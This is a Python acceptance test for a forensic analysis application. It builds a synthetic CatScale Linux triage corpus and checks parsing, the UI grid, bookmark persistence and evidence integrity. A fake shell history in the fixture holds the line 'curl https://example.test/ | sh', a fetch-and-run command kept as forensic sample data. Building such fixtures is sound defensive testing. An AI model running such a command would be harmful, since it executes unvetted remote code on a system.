"""CatScale acceptance corpus matching the pinned collector's command outputs."""
import io
from pathlib import Path
import tarfile
import time


def write_corpus(directory):
    directory=Path(directory);directory.mkdir(parents=True)
    samples={
        'Process_and_Network/node-20261102-1000-processes-ef.txt':'UID PID PPID C STIME TTY TIME CMD\nroot 42 1 0 10:00 ? 00:00 /usr/bin/python app.py --flag\n',
        'Process_and_Network/node-20261102-1000-ss-anepo.txt':'Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp ESTAB 0 0 [::1]:22 [::1]:44000 users:(("sshd",pid=42,fd=3))\n',
        'Persistence/node-20261102-1000-cron-tab-list.txt':'root\n@reboot /opt/start --mode test\nENDOFUSERCRON\n',
        'Persistence/node-20261102-1000-systemctl_service_status.txt':'ssh.service loaded active running OpenBSD Secure Shell server\n',
        'System_Info/node-20261102-1000-release.txt':'NAME="Test Linux"\nKERNELVERSION(uname -r)=6.8\n',
        'User_Files/hidden-user-home-dir/home/alice/bash_history':'#1793613600\nwhoami\ncurl https://example.test/ | sh\n',
        'Misc/node-20261102-1000-full-timeline.csv':'Inode,Hard link Count,Full Path,Last Access,Last Modification,Last Status Change,File Creation,User,Group,File Permissions,File Size(bytes)\n123,1,/tmp/file,with,commas,2026-11-02 10:00:00 +0000,2026-11-02 10:01:00 +0000,2026-11-02 10:02:00 +0000,-,alice,users,-rw-r--r--,42\n',
        'Docker/node-20261102-1000-docker-info.txt':'Containers: 2\nRunning: 1\n',
    }
    for relative,text in samples.items():
        path=directory/relative;path.parent.mkdir(parents=True,exist_ok=True);path.write_text(text,encoding='utf-8')
    target=directory/'Logs'/'node-20261102-1000-var-log.tar.gz';target.parent.mkdir()
    with tarfile.open(target,'w:gz') as archive:
        value=b'Nov  2 10:00:00 node sshd[42]: Failed password for alice\n'
        member=tarfile.TarInfo('var/log/auth.log');member.size=len(value);archive.addfile(member,io.BytesIO(value))
    return directory


def verify_catscale(app,directory,settings=None):
    from fireblade.core.collection import Collection,ToolPack,sha256
    from fireblade.core.engine import Case
    from fireblade.core.models import Filter,View
    from fireblade.ui.app import Window
    directory=Path(directory);source=write_corpus(directory/'evidence')
    originals={path:sha256(path) for path in source.rglob('*') if path.is_file()}
    errors=[];window=Window(require_case=False, settings=settings,investigation_root=directory/'cases');window.error=lambda value:errors.append(str(value));window.show()
    def settle():
        deadline=time.monotonic()+30
        while time.monotonic()<deadline:
            app.processEvents()
            if not window.busy and not window.jobs and not window.pool.activeThreadCount() and not getattr(window,'_collection_open_pending',False) and (window.model is None or not window.model.jobs) and not window.tabs.pending:
                if errors:raise AssertionError(str(errors))
                return
            time.sleep(.005)
        raise AssertionError('CatScale UI did not settle')
    try:
        investigation=window.create_investigation('Qualification CatScale',environment='linux')
        if not investigation:raise AssertionError(str(errors))
        collection=Collection(source,window.investigation_data_directory('Collectes')/'catscale',ToolPack(directory/'no-external-engines'),settings,organization='artifacts')
        report=collection.parse()
        if report['status']!='complete' or len(report['documents'])!=7:raise AssertionError('Missing CatScale families')
        window.collection=collection;window.collection_finished(report);settle()
        families=set();structured=raw=0;process_index=None
        for index,snapshot in enumerate(window.documents):
            owned=window.case.path!=Path(snapshot.path)
            case=Case(snapshot.path,settings=settings,read_only=True) if owned else window.case
            try:
                headers=case.headers
                if case.count(View())==0:raise AssertionError('Empty CatScale analysis')
                families.update(row[1+headers.index('Famille')] for row in case.page(View()))
                if 'PID' in headers and case.count(View(filters=[Filter(headers.index('PID'),'eq','42')])):process_index=index
                for row in case.page(View()):
                    structured+=row[1+headers.index('Lecture')]=='Structurée';raw+=row[1+headers.index('Lecture')]=='Brute'
            finally:
                if owned:case.close()
        if len(families)!=7 or process_index is None or not structured:raise AssertionError('Missing CatScale fields')
        window.switch_document(process_index);settle()
        if not window.model or window.model.rowCount()==0:raise AssertionError('CatScale grid is empty')
        window.case.bookmark(1,'Note CatScale')
        saved_path=window.case.path
        if not window.close_investigation():raise AssertionError('Case save failed')
        if window.case is not None or window.documents:raise AssertionError('Case remained loaded')
        if not window.open_investigation(investigation['id']):raise AssertionError('Case reopen failed')
        settle()
        if window.case.path!=saved_path or window.case.bookmarks()!={1:'Note CatScale'}:raise AssertionError('CatScale session or notes lost')
        if not all(sha256(path)==digest for path,digest in originals.items()):raise AssertionError('CatScale evidence changed')
        return dict(status='passed',families=sorted(families),analyses=len(window.documents),structured_records=structured,raw_records=raw,source_files_unchanged=True,case_restored=True)
    finally:
        window.close();window.deleteLater()
